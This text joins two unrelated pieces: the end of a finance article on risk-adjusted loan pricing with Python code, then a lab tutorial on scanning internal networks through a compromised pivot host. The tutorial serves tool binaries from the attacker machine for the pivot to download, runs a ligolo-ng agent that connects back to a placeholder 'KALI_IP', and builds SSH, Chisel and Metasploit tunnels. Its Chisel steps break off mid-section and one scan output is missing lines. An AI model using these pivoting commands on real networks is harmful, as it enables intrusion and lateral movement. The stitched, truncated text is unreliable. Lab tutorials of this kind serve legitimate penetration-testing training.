Now it’s easy to pick a value for r. Let’s say our bank operates with 10% leverage and generates a 15% ROE.

By Equation 22, r = 0.15 / 10 = 1.50% per annum.

This is the number we should add to the cost of funding and the expected loss spread to calculate the final interest rate.

In other words, the bank needs to earn a 1.50% annual premium on its loan book to deliver a 15% return on equity to its shareholders.

Now, we must also determine the cost of funding by using a similar approach.

Just as we decomposed the interest rate into risk and profitability components, we can break down the cost of funding into two main parts: the risk-free rate and the credit spread that reflects the bank’s own cost of raising funds.

We can express this as Equation 23:

  • c is the total cost of funding.
  • rf is the risk-free rate.
  • sb​ is the bank’s credit spread.

The risk-free rate is the return an investor would expect from a completely safe asset, like a government bond. It represents the baseline cost of money in the economy.

The bank’s credit spread is an additional premium that investors demand for lending money to the bank, reflecting the bank’s own credit risk and the liquidity of its funding instruments.

There are mathematical approaches to calculate the bank’s credit spread, but here we simplify the framework by assuming it as a fixed premium over the risk‑free rate.

In practice, this means the bank pays its investors a rate equal to the risk‑free rate (e.g., SOFR) plus an additional spread.

By the time of writing, SOFR is approximately 3.62% per annum, implying a monthly rate of about 0.296% under compounding, so that’s the number I’m keeping plus let’s say 0,347% extra for investors (sb).

I picked that extra because 0.643% monthly is approximately 8.0% per annum, a well-established cost of capital for a medium-sized bank.

Finally, we can translate all the effort so far into a single final equation representing the interest rate:

How Much Should the Bank Charge

Well, we have covered a lot in the previous sections to answer what initially seemed like a simple, yet surprisingly challenging question.

We learned that the contract term directly affects the required spread, meaning that loan offers should be tailored not only to the borrower’s risk profile but also to the number of installments.

We also developed a framework to estimate both the cost of funding and the desired profitability of the lending operation.

Now, all that remains is to put everything together into a single function capable of pricing the same loan for credit ratings ranging from A to E.

That is exactly what the function risk_adjusted_price_table does:

def risk_adjusted_price_table(
    ratings,
    principal=1000,
    n_periods=12,
    funding_cost_annual=0.08,
    profitability_annual=0.015,
    loss_given_default=0.70,
    hazard_type="weibull"
):
    funding_cost_monthly = (1 + funding_cost_annual) ** (1 / 12) - 1
    profitability_monthly = (1 + profitability_annual) ** (1 / 12) - 1

    results = []

    for rating, default_probability in ratings.items():

        # Expected Loss Spread (monthly)
        els_bps = expected_loss_spread(
            default_probability=default_probability,
            n_periods=n_periods,
            loss_given_default=loss_given_default,
            hazard_type=hazard_type
        )

        els_monthly = els_bps / 10000

        # Final lending rate (Equation 24)
        final_rate_monthly = (
            funding_cost_monthly +
            els_monthly +
            profitability_monthly
        )

        # Price schedule
        schedule = price_schedule(
            pv=principal,
            rate=final_rate_monthly,
            n_periods=n_periods
        )

        installment = schedule.loc[1, "installment"]

        results.append({
            "Rating": rating,
            "Funding Cost (% p.a.)": round(funding_cost_annual * 100, 2),
            "Expected Loss Spread (% p.a.)": round(((1 + els_monthly) ** 12 - 1) * 100, 2),
            "Profitability (% p.a.)": round(profitability_annual * 100, 2),
            "Final Rate (% p.a.)": round(((1 + final_rate_monthly) ** 12 - 1) * 100, 2),
            "Monthly Installment": round(installment, 2)
        })

    return pd.DataFrame(results).sort_values("Rating").reset_index(drop=True)


ratings = {
    "A": 0.02,
    "B": 0.05,
    "C": 0.10,
    "D": 0.20,
    "E": 0.35
}

df_pricing = risk_adjusted_price_table(
    ratings=ratings,
    principal=1000,
    n_periods=12,
    funding_cost_annual=0.08,
    profitability_annual=0.015,
    loss_given_default=0.70,
    hazard_type="weibull"
)

df_pricing

The function uses the rating distribution and their corresponding default probabilities as inputs. We assume a one-year loan by setting n_periods to 12 and recreate a lending operation with a principal of $1,000.

The remaining inputs are exogenous assumptions. We set funding_cost_annual to 8% per year, profitability_annual to 1.5% per year, assume a constant loss_given_default of 70%, and model the survival dynamics using Weibull hazard curves by setting hazard_type to "weibull".

Internally, the function reuses the previously developed functions expected_loss_spread and price_schedule, computes the risk-adjusted lending rate according to Equation 24, and finally recalculates the corresponding Price installment for each credit rating.

The result is Table 10, below:

For this configuration, the columns Final Rate (% p.a.) and Monthly Installment, respectively, determine the annual interest rate charged for each credit rating and the corresponding fixed installment paid by the borrower.

We observe that the annual interest rate for rating E is approximately 3.25 times that of rating A.

In other words, for every $1.00 of annual interest charged to a rating A borrower, the bank charges approximately $3.25 to a rating E borrower to compensate for the substantially higher expected credit risk.

We have done it. We have successfully translated default risk into loan pricing.

In this particular example, every contract remains economically viable. Even the 35.38% annual interest rate charged to rating E is within a range that could reasonably be observed in the market.

Predictable Revenue

One of the main conclusions of this framework is that, once funding costs and expected losses have been incorporated into the lending rate, the remaining profitability component becomes predictable.

Recall that the final lending rate was decomposed into three parts: the funding cost, the expected loss spread, and the required profitability. The first compensates investors who finance the operation, the second offsets expected credit losses, and only the third represents the bank’s expected economic profit.

Since the expected loss spread was calibrated to compensate for future defaults, the lending portfolio is expected to break even on credit risk. As a result, every dollar collected through the profitability premium contributes directly to the bank’s earnings.

For a single contract, the expected net profit (E[Π]) can therefore be expressed as :

where r is the required profitability premium and Bₜ₋₁ is the outstanding balance before installment t.

The equation highlights an important property of the proposed framework. Profit is earned only while the contract remains alive and is proportional to the outstanding balance. As the borrower amortizes the loan, the balance decreases and so does the profit generated by the operation.

When applied to a sufficiently diversified portfolio, individual defaults become part of the expected behavior already incorporated into pricing. Consequently, although some contracts will inevitably generate losses, the portfolio as a whole produces a stable and predictable stream of earnings driven by the profitability premium.

With this concept, we can estimate the total expected profit for any new contract. Since credit risk and expected losses are already embedded in the pricing, what remains is the net profitability of the business.

Model Limitations

Here we start from a theoretical model adjusted for credit default risk in personal loan contracts. We introduce a set of constraints and assumptions in order to build a coherent narrative with a clear beginning, middle, and end.

In real-world or production settings, the story is slightly different from the one we present here. The core principles remain valid, but there are inherent weaknesses that need to be addressed when the portfolio is simulated as a whole.

In this section, I introduce some of these limitations, which will be further explored in Part 2 of this article.

First, credit card operations follow the same conceptual framework described here, but the expected loss model introduces several nuances. For instance:

The EAD is the customer’s own outstanding balance immediately prior to default. Between the moment a customer stops paying a credit card bill and the point at which they are officially classified as defaulted, there is an accrual period in which interest continues to accumulate, artificially increasing the observed balance.

There is both voluntary and involuntary churn, which means the survival-based approach does not strictly correspond to a simple “survives vs. defaults” event. For example, a customer may not transact in the following month but can still “reactivate” or survive in a subsequent period.

The customer may finance a purchase, causing the outstanding balance to be carried over through monthly invoices. This type of revolving credit increases profitability as long as the customer fully repays the debt.

However, the customer may also utilize the credit limit continuously and delay default by paying only the minimum invoice amount. In this scenario, the account remains active but deteriorates over time, surviving in a degraded state.

Additionally, in this framework we assume exogenous variables to enable risk-level comparisons. In practice, however, LGD is itself model-dependent, as customers exhibit heterogeneous propensities to repay their obligations.

Thus, LGD can be directly linked to the origination risk model of the loan, however, we build its on model based on the recovery capacity of each customer profile, what we call a collection model.

Under a non-constant LGD assumption, the intuition still holds that lower-risk customers tend to recover more of their defaulted balance. However, deterioration in repayment capacity can increase losses to a level where pricing is no longer sufficient to support a realistic offer.

Finally, and most importantly, PD is not constant over time and cannot be properly represented by a simple hazard rate. In theory, we often work backwards: we start from an observed outcome and calibrate a rate that maps to that final state.

In reality, although cumulative PD is always increasing, the marginal PD of each contract may fluctuate, introducing an additional dynamic component.

Furthermore, the probability of default (PD) is time-dependent, as exogenous macroeconomic conditions can systematically shift credit risk across the financial system.

All of these topics will be partially addressed in Part 2 of this article, where we simulate a loan portfolio under non-constant LGD and non-stationary PD.

Final Thoughts

This article develops a complete framework for credit pricing by linking financial mathematics, risk modeling, and portfolio economics into a unified structure.

Starting from compound interest and the Price amortization system, we show how loan cash flows are structured and how breakeven emerges from the interaction between installments, funding costs, and time.

We then extend the model to incorporate credit risk through expected loss (PD, LGD, and EAD), showing how defaults reshape profitability and why pricing must move beyond flat interest rates to risk-adjusted lending. Survival analysis further introduces the time dimension of credit risk, highlighting that default is not static but evolves over the life of the contract.

By combining survival dynamics with expected loss modeling, we derive a spread that compensates for credit risk while maintaining economic viability. However, true profitability only emerges when funding costs and required return on equity are included, leading to a final risk-adjusted pricing equation that decomposes interest rates into funding, risk, and profit components.

The main conclusion is that credit pricing is fundamentally a constrained optimization problem: banks must balance risk compensation, capital return requirements, and competitiveness while accounting for the amortizing nature of exposure over time. Longer contracts dilute exposure but extend risk duration, creating a non-trivial trade-off between time and default probability.

Overall, the model shows how predictable revenue can be achieved when expected losses are properly priced, turning credit risk from an uncertainty into a quantifiable component of loan pricing.

Finally, optimizing credit offer interest rates to achieve a competitive market position while preserving the bank’s target profitability enables broader credit expansion, making financing more accessible across the economy and supporting financial inclusion, particularly for underserved segments.

References

Brealey, R. A., Myers, S. C., & Allen, F. Principles of Corporate Finance. McGraw-Hill.

Hull, J. C. Options, Futures, and Other Derivatives. Pearson.

Basel Committee on Banking Supervision (BCBS). International Convergence of Capital Measurement and Capital Standards (Basel II/III).

Duffie, D., & Singleton, K. J. Credit Risk: Pricing, Measurement, and Management. Princeton University Press.

Altman, E. I. Financial Ratios, Discriminant Analysis and the Prediction of Corporate Bankruptcy. Journal of Finance.

Klein, J. P., & Moeschberger, M. L. Survival Analysis: Techniques for Censored and Truncated Data. Springer.

item.title: Nmap Through Pivots: Scanning Internal Networks
item.content:encoded:
You’re inside the network. The interesting machines aren’t on the same subnet. Here’s how Nmap still reaches them — and where it breaks.

Series: Nmap — The Tool You Think You Know | Part 9 of 16

You’ve exploited a machine. You have a shell. Now you find out the target you actually care about is on a different subnet — one you can’t reach directly from your Kali machine. This is pivoting, and this is where most beginners get stuck.

Nmap is one of the first tools you may want to run after pivoting, but standard Nmap flags don’t work the same way through a proxy chain. This article explains why, what works, what doesn’t, and what to do when proxychains gives you unreliable results.

Everything here was run against a real lab: Kali as the attacker, Metasploitable2 as the pivot, and a second internal Metasploitable2 as the target. Nothing is fabricated.

There are three distinct ways to scan through a pivot, and they are not interchangeable:

  • Layer 1 — Scan from the pivot host directly. Best option when you have shell access, and Nmap is installed.
  • Layer 2 — SOCKS proxy via SSH or Chisel + proxychains. Works for TCP tools from Kali, with known limitations.
  • Layer 3 — Full TUN routing via ligolo-ng or Metasploit. Best when you need unrestricted routing from Kali.

Start at Layer 1 and only move down when you need to.

The Problem: You Can’t Reach the Internal Network

This is what you see before any pivot is set up. From Kali, the pivot machine 10.38.1.121 is reachable. The internal target 10.30.1.111 is not:

# ping -c 2 10.38.1.121
PING 10.38.1.121 (10.38.1.121) 56(84) bytes of data.
64 bytes from 10.38.1.121: icmp_seq=1 ttl=64 time=54.6 ms
64 bytes from 10.38.1.121: icmp_seq=2 ttl=64 time=9.10 ms
--- 10.38.1.121 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1001ms
# ping -c 2 10.30.1.111
PING 10.30.1.111 (10.30.1.111) 56(84) bytes of data.
--- 10.30.1.111 ping statistics ---
2 packets transmitted, 0 received, 100% packet loss, time 1025ms

10.30.1.111 drops every packet. You need to go through the pivot.

What Pivoting Is — Brief Context

A pivot is using a compromised machine as a relay to reach otherwise inaccessible networks. The compromised machine 10.38.1.121 has two network interfaces — one on your subnet and one on an internal 10.30.1.0/24 network you can't reach directly.

Your Kali → 10.38.1.121 (pivot) → 10.30.1.0/24 (internal)

Once you’re on the pivot, you can confirm the network layout with ip a, ip route, and arp -a.

Getting on the Pivot and Mapping the Internal Network

SSH into the pivot. This machine was running an old SSH server that required legacy key negotiation flags:

ssh -o KexAlgorithms=+diffie-hellman-group1-sha1 \
    -o HostKeyAlgorithms=+ssh-rsa \
    msfadmin@10.38.1.121
The authenticity of host '10.38.1.121 (10.38.1.121)' can't be established.
RSA key fingerprint is: SHA256:BQHm5EoHX9GCiOLuVscegPXLQOsuPs+E9d/rrJB84rk
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.38.1.121' (RSA) to the list of known hosts.
msfadmin@10.38.1.121's password:
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686
Last login: Thu May 14 07:00:15 2026
msfadmin@metasploitable:~$

Check the network interfaces:

msfadmin@metasploitable:~$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 16436 qdisc noqueue
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast qlen 1000
    inet 10.0.2.15/24 brd 10.0.2.255 scope global eth0
3: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast qlen 1000
    inet 10.38.1.121/24 brd 10.38.1.255 scope global eth1
4: eth2: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast qlen 1000
    inet 10.30.1.122/24 brd 10.30.1.255 scope global eth2
msfadmin@metasploitable:~$ ip route
10.30.1.0/24 dev eth2  proto kernel  scope link  src 10.30.1.122
10.0.2.0/24 dev eth0   proto kernel  scope link  src 10.0.2.15
10.38.1.0/24 dev eth1  proto kernel  scope link  src 10.38.1.121
default via 10.0.2.2 dev eth0  metric 100
msfadmin@metasploitable:~$ arp -a
? (10.38.1.120) at 3c:a9:f4:1b:7e:02 [ether] on eth1
? (10.0.2.2) at b4:e6:2d:08:3f:91 [ether] on eth0

eth2 provides access to the internal subnet 10.30.1.0/24. The pivot has a foot in both worlds.

Now find what’s alive on the internal subnet. From the pivot, a ping sweep works without any proxy:

msfadmin@metasploitable:~$ for i in $(seq 1 254); do ping -c1 -W1 10.30.1.$i 2>/dev/null | grep "64 bytes" && echo "10.30.1.$i is UP"; done
64 bytes from 10.30.1.1: icmp_seq=1 ttl=255 time=5.75 ms
10.30.1.1 is UP
64 bytes from 10.30.1.111: icmp_seq=1 ttl=64 time=13.1 ms
10.30.1.111 is UP
64 bytes from 10.30.1.122: icmp_seq=1 ttl=64 time=0.092 ms
10.30.1.122 is UP

Three hosts alive: gateway at .1, target at .111, and .122 which is the pivot itself.

Layer 1 — Scan From the Pivot Directly

This is the most reliable option. You’re scanning from inside the internal network — no tunnel overhead, no proxy limitations, and all scan types available:

msfadmin@metasploitable:~$ nmap -sT -PN -p 22,80,443,21,23,3306,8080,6667 10.30.1.111
Starting Nmap 4.53 ( http://insecure.org ) at 2026-05-14 07:07 EDT
Interesting ports on 10.30.1.111:
PORT      STATE   SERVICE
21/tcp    open    ftp
22/tcp    open    ssh
23/tcp    open    telnet
80/tcp    open    http
443/tcp   closed  https
3306/tcp  open    mysql
6667/tcp  open    irc
8080/tcp  closed  http-proxy
Nmap done: 1 IP address (1 host up) scanned in 0.106 seconds

Add version detection:

msfadmin@metasploitable:~$ nmap -sT -PN -sV -p 22,80,443,21,23,3306,8080,6667 10.30.1.111
Starting Nmap 4.53 ( http://insecure.org ) at 2026-05-14 07:07 EDT
Interesting ports on 10.30.1.111:
PORT      STATE   SERVICE  VERSION
21/tcp    open    ftp      vsftpd 2.3.4
22/tcp    open    ssh      OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp    open    telnet   Linux telnetd
80/tcp    open    http     Apache httpd 2.2.8 ((Ubuntu) DAV/2)
443/tcp   closed  https
3306/tcp  open    mysql    MySQL 5.0.51a-3ubuntu5
6667/tcp  open    irc      Unreal ircd
8080/tcp  closed  http-proxy
Service Info: Host: irc.Metasploitable.LAN; OSs: Unix, Linux
Nmap done: 1 IP address (1 host up) scanned in 6.540 seconds

Fast, accurate, no workarounds. When later layers give you inconsistent results, come back to this output — it’s the ground truth.

One thing worth noting: this pivot was running Nmap 4.53, old enough that --script vuln fails:

msfadmin@metasploitable:~$ nmap -sT -PN --script vuln -p 22,80,443,21,23,3306,8080,6667 10.30.1.111
SCRIPT ENGINE: No such category, file or directory: 'vuln'
SCRIPT ENGINE: Aborting script scan.

NSE categories didn’t exist in Nmap 4.53. When the pivot has an outdated Nmap, run your scripts from Kali through a tunnel. That’s Layer 2.

Layer 2 — SOCKS Proxy via SSH or Chisel + Proxychains

Use this layer when you need to run Kali-side tools against the internal network. Two methods to create the SOCKS proxy: SSH dynamic forwarding with no extra tooling, and Chisel for when SSH forwarding isn’t an option.

What Proxychains Can and Can’t Do

Proxychains intercepts full TCP connect calls at the application layer and routes them through the SOCKS proxy. That’s the extent of it. It cannot intercept raw socket operations, ICMP, or UDP traffic.

This makes certain Nmap scan types incompatible with proxychains — not just slower, but fundamentally broken:

Compatible with proxychains:
  proxychains nmap -sT   → Full TCP connect — the only Nmap scan type that works
  proxychains curl       → HTTP/HTTPS to internal services
  proxychains ftp        → FTP connections
  proxychains ssh        → SSH to internal hosts
  proxychains netcat     → Raw TCP connects
Incompatible:
  proxychains nmap -sS   → SYN scan uses raw sockets — bypasses the proxy entirely
  proxychains nmap -sU   → UDP doesn't relay through SOCKS regardless of version
  proxychains nmap -O    → OS detection requires raw sockets — same problem as -sS
  proxychains ping       → ICMP doesn't go through SOCKS
  DNS resolution         → Queries bypass the proxy — always use -n with Nmap

-sS, -O, and -sU Don't underperform through proxychains — they either silently bypass the proxy or return results with no relationship to the actual target. Don't use them here.

The mandatory base flags for any proxychains Nmap scan:

proxychains nmap -sT -Pn -n <target>
  • -sT — full TCP connect; the only scan mode proxychains can relay
  • -Pn — skip host discovery; ICMP probes don't route through SOCKS
  • -n — skip DNS resolution; DNS queries bypass the proxy

Method 1: SSH Dynamic Port Forwarding

No extra binaries needed. If you have SSH access to the pivot, this is the fastest tunnel to set up:

# From Kali — creates a SOCKS5 proxy on localhost:1080
ssh -o KexAlgorithms=+diffie-hellman-group1-sha1 \
    -o HostKeyAlgorithms=+ssh-rsa \
    -D 1080 -N -f msfadmin@10.38.1.121

Verify it’s listening:

# ss -tlnp | grep 1080
LISTEN 0  128  127.0.0.1:1080  0.0.0.0:*  users:(("ssh",pid=3216,fd=5))
LISTEN 0  128      [::1]:1080     [::]:*  users:(("ssh",pid=3216,fd=4))

Confirm proxychains4.conf is pointed at it:

# tail -5 /etc/proxychains4.conf
# add proxy here ...
# meanwhile
# defaults set to "tor"
socks5 127.0.0.1 1080

SSH -D creates SOCKS5 by default — nothing else to configure. The limitation is that it requires SSH access to the pivot. If you have a raw reverse shell instead, use Chisel.

Method 2: Chisel

Chisel works when SSH dynamic forwarding isn’t available — restricted shell, SSH forwarding disabled, or access gained through something other than SSH.

Check the pivot’s architecture before downloading:

ssh -o KexAlgorithms=+diffie-hellman-group1-sha1 \
    -o HostKeyAlgorithms=+ssh-rsa \
    msfadmin@10.38.1.121 "uname -m"
i686

32-bit. The 386 build is required.

On Kali — download, prepare, and serve:

wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_386.gz
gunzip chisel_1.7.7_linux_386.gz
mv chisel_1.7.7_linux_386 chisel32_old
chmod +x chisel32_old
python3 -m http.server 8888

On the pivot — fetch and verify:

msfadmin@metasploitable:/tmp$ wget http://10.38.1.120:8888/chisel32_old -O /tmp/chisel_old
Connecting to 10.38.1.120:8888... connected.
HTTP request sent, awaiting response... 200 OK
Length: 7,118,848 (6.8M) [application/octet-stream]
100%[==================================>] 7,118,848   6.64M/s
07:17:36 (6.62 MB/s) - '/tmp/chisel_old' saved [7118848/7118848]
msfadmin@metasploitable:/tmp$ chmod +x /tmp/chisel_old
msfadmin@metasploitable:/tmp$ /tmp/chisel_old --version
1.7.7

Start the server on Kali:

The Unreliable Results Problem

Here’s what doesn’t get written about enough: proxychains + Nmap can produce misleading results even when the tunnel is confirmed working, and the flags are correct.

In this lab, the same target scanned cleanly from Layer 1 returned this through the SSH SOCKS proxy:

# proxychains nmap -sT -Pn -p 21,22,23,80,3306,6667 10.30.1.111 2>/dev/null
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-14 07:43 -0400
Nmap scan report for 10.30.1.111
Host is up.
PORT      STATE     SERVICE
21/tcp    filtered  ftp
22/tcp    filtered  ssh

6667/tcp  filtered  irc

All filtered — but those ports are confirmed open from Layer 1. The tunnel is also routing correctly (curl proved it). The issue is latency: SOCKS adds a connection overhead per probe, and some proxychains/Nmap combinations are sensitive to this. When responses arrive later than Nmap expects, it marks ports as filtered. This is a timing issue, not a network block.

This is why Layer 1 results take priority when there’s a disagreement.

Tuning for Better Results

When Nmap reports filtered on ports you know are open, reduce concurrency and extend timeouts:

proxychains nmap -sT -Pn -n \
    --max-parallelism 1 \
    --scan-delay 500ms \
    --max-retries 3 \
    -p 21,22,23,80,3306,6667 10.30.1.111

--max-parallelism is the primary knob for per-host probe concurrency. For subnet scans, also reduce --max-hostgroup to control how many hosts are worked in parallel — this prevents the tunnel from getting saturated across multiple targets:

proxychains nmap -sT -Pn -n \
    --max-parallelism 5 \
    --max-hostgroup 3 \
    --host-timeout 10m \
    10.30.1.0/24

Tuning helps, but doesn’t always resolve the issue. If results remain unreliable after adjustment, move to Layer 3.

SOCKS4 vs SOCKS5

SSH -D and Chisel both create SOCKS5 proxies by default. SOCKS5 supports full TCP and is what you want. SOCKS4 is TCP-only with no authentication support — less compatible.

Neither version relays UDP through proxychains in practice. The SOCKS5 spec technically defines UDP support, but proxychains doesn’t implement it. proxychains nmap -sU will silently fail regardless of which version is in use. For UDP scanning through a pivot, move to Layer 3.

Layer 3 — Full TUN Routing via ligolo-ng or Metasploit

SOCKS is adequate for targeted TCP tool usage, but it has a ceiling. When you need SYN scans, UDP, OS detection, or tools that don’t support SOCKS at all, you need a proper tunnel that makes the internal network appear as a local subnet on your Kali machine. Layer 3 removes the proxy entirely from the picture.

ligolo-ng

ligolo-ng creates a TUN interface on Kali rather than a SOCKS proxy. Once set up, traffic to the internal subnet routes like normal network traffic from your machine — no proxychains, no TCP-only restriction, no timing workarounds needed.

Download pre-built binaries from the releases page. No compiling required. Grab the proxy binary for Kali and the agent binary matching the pivot’s architecture:

# Check the releases page for the latest version before downloading
# https://github.com/nicocha30/ligolo-ng/releases
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_linux_386.tar.gz
tar -xzf ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
tar -xzf ligolo-ng_agent_0.8.2_linux_386.tar.gz
# Create the TUN interface on Kali — requires root, one-time setup
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
# Start the proxy
sudo ./proxy -selfcert -laddr 0.0.0.0:11601

Transfer the agent to the pivot and connect it back:

# On the pivot:
./agent -connect KALI_IP:11601 -ignore-cert

Select the session in the proxy console and start routing:

# In the ligolo-ng proxy console
ligolo-ng » session
ligolo-ng » tunnel_start --tun ligolo
# On Kali — add the internal subnet route
sudo ip route add 10.30.1.0/24 dev ligolo

Now run Nmap directly from Kali with no wrapper:

nmap -sS -Pn -sV -p 21,22,23,80,3306,6667 10.30.1.111

SYN scans work. UDP scans work. OS detection works. This is the method to reach for when Layer 2 is producing unreliable results, or you need full routing capability.

The tradeoffs: root is required on Kali to create the TUN interface, and the agent needs to be transferred to the pivot. This project moves fast — always check the releases page rather than assuming a version number is current.

Metasploit Route + socks_proxy

If you’re already working in Metasploit with an active Meterpreter session, the built-in route management handles internal network access without any extra tooling:

# Inside msfconsole — add internal route through the active Meterpreter session
msf> route add 10.30.1.0 255.255.255.0 <session_id>

This is Metasploit’s internal route management. It tells Metasploit’s own scanner modules to reach 10.30.1.0/24 through the specified session, so you can run use auxiliary/scanner/* modules directly against internal hosts without proxychains.

If you also need external tools (like Nmap or curl on Kali) to reach the internal network, expose it as a SOCKS proxy:

msf> use auxiliary/server/socks_proxy
msf> set SRVPORT 1080
msf> set VERSION 5
msf> run -j

Then point proxychains at it as usual. The difference from SSH/Chisel is that the routing here goes through Metasploit’s session management rather than an independent tunnel.
